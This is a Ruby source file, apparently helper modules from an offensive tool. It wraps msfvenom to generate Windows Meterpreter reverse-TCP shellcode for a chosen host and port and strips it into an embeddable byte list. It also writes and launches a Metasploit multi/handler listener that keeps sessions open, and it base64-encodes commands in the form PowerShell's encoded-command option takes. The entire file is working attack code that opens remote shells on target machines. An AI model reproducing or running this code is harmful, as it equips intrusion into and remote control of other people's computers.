#!/usr/bin/env ruby
module MainCommands
  def print_error(text)
    print "\e[31m[-]\e[0m #{text}"
  end 
  def print_info(text)
    print "\e[34m[*]\e[0m #{text}"
  end 
  def print_success(text)
    print "\e[32m[+]\e[0m #{text}"
  end 
  def get_input(text)
    print "\e[33m[!]\e[0m #{text}"
  end 
  def encoded_command(command)
    encoded_command = Base64.encode64(command.encode("utf-16le")).delete("\r\n")
  end
end
module MsfCommands
  def generate_shellcode(host,port)
    if File.exist?('/usr/bin/msfvenom')
      msf_path = '/usr/bin/'
    elsif File.exist?("/opt/metasploit-framework/msfvenom")
      msf_path = ('/opt/metasploit-framework/')
    else
      print_error("Metasploit Not Found!")
      exit
    end
    @set_payload = "windows/meterpreter/reverse_tcp"
    print_info("Generating shellcode\n")
    execute  = `#{msf_path}./msfvenom --payload #{@set_payload} LHOST=#{host} LPORT=#{port} C`
    shellcode = clean_shellcode(execute)
    puts shellcode
  end
  def clean_shellcode(shellcode)
    shellcode = shellcode.gsub('\\',",0")
    shellcode = shellcode.delete("+")
    shellcode = shellcode.delete('"')
    shellcode = shellcode.delete("\n")
    shellcode = shellcode.delete("\s")
    shellcode[0..4] = ''
    return shellcode
  end
  def metasploit_setup(msf_path,host,port)
    print_info("Setting up Metasploit this may take a moment\n")
    rc_file = "msf_listener.rc"
    file = File.open("#{rc_file}",'w')
    file.write("use exploit/multi/handler\n")
    file.write("set PAYLOAD #{@set_payload}\n")
    file.write("set LHOST #{host}\n")
    file.write("set LPORT #{port}\n")
    file.write("set EnableStageEncoding true\n")
    file.write("set ExitOnSession false\n")
    file.write("exploit -j")
    file.close
    system("#{msf_path}./msfconsole -r #{rc_file}")
  end
end
